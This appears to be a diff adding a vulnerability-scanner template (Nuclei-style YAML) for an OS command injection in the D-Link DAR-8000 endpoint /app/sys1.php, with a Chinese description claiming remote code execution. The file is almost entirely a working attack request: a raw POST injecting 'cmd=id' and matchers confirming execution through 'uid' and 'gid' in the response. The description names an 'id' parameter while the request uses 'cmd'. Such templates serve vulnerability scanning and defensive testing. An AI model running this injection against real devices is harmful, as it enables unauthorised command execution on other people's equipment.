@@ -1,0 +1,37 @@
+id: d-link-dar-8000-command-injection
+
+info:
+  name: "D-Link DAR-8000 sys1.php 接口id参数OS命令注入"
+  author: 0dayPoc
+  severity: high
+  description: |-
+    通过分析发现，D-Link DAR-8000-10版本中，/app/sys1.php接口的id参数未正确过滤用户输入，攻击者可构造恶意命令字符串实现远程代码执行。该缺陷源于对用户输入的动态命令拼接缺乏有效校验机制。
+  tags: D-Link
+
+http:
+- raw:
+  - |
+    POST /app/sys1.php HTTP/1.1
+    Host: {{Hostname}}
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+    Accept-Encoding: gzip, deflate
+    Upgrade-Insecure-Requests: 1
+    Te: trailers
+    Connection: close
+    Content-Type: application/x-www-form-urlencoded
+    Content-Length: 6
+
+    cmd=id
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'uid'
+  - type: word
+    part: body
+    words:
+    - 'gid'
